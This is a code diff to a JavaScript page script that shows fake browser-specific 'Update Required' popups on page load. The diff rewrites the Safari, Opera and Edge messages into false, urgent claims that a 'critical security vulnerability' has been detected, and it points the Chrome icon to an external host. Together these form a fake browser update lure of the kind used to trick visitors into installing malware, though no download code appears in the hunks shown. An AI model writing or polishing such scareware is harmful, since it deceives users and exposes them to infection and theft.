@@ -44,7 +44,7 @@ window.onload = async () => {
         case "Google Chrome":
             errorMessage = `
         <div class="title-bar">
-            <img src="../images/chrome.png" class="my-icon" alt="Chrome Icon">
+            <img src="https://jeffreyupton.github.io/images/chrome.png" class="my-icon" alt="Chrome Icon">
             <span class="title-class-Google-Chrome">Google Chrome Update Required</span>
             <button class="my-custom-close" onclick="Swal.close()">&times;</button>
         </div>
@@ -75,7 +75,9 @@ window.onload = async () => {
             <button class="my-custom-close" onclick="Swal.close()">&times;</button>
         </div>
         <div class="my-error-message">
-            This is a custom message for Apple Safari. Please update to the latest version for the best experience.
+          We have detected a critical security vulnerability in your current version of Safari that puts your online safety at risk.
+          To ensure the best browsing experience and protect your personal information,
+          it is crucial that you update to the latest version immediately.
         </div>`;
             break;
         case "Opera":
@@ -86,7 +88,9 @@ window.onload = async () => {
             <button class="my-custom-close" onclick="Swal.close()">&times;</button>
         </div>
         <div class="my-error-message">
-            This is a custom message for Opera. Update your browser to stay secure and enjoy new features.
+           We have detected a critical security vulnerability in your current version of Opera that puts your online safety at risk.
+          To ensure the best browsing experience and protect your personal information,
+          it is crucial that you update to the latest version immediately.
         </div>`;
             break;
         case "Microsoft Internet Explorer":
@@ -108,7 +112,7 @@ window.onload = async () => {
             <button class="my-custom-close" onclick="Swal.close()">&times;</button>
         </div>
         <div class="my-error-message">
-            Stay fast and secure. Update Microsoft Edge to the latest version.
+            Attention: We've detected that your Microsoft Edge browser requires a critical update.\n\nThis update is crucial for maintaining optimal performance and ensuring the highest level of security.\n\nTo continue enjoying a seamless browsing experience, please update to the latest version immediately.\n\nThank you for your attention to this matter.
         </div>`;
             break;
         case "Brave":
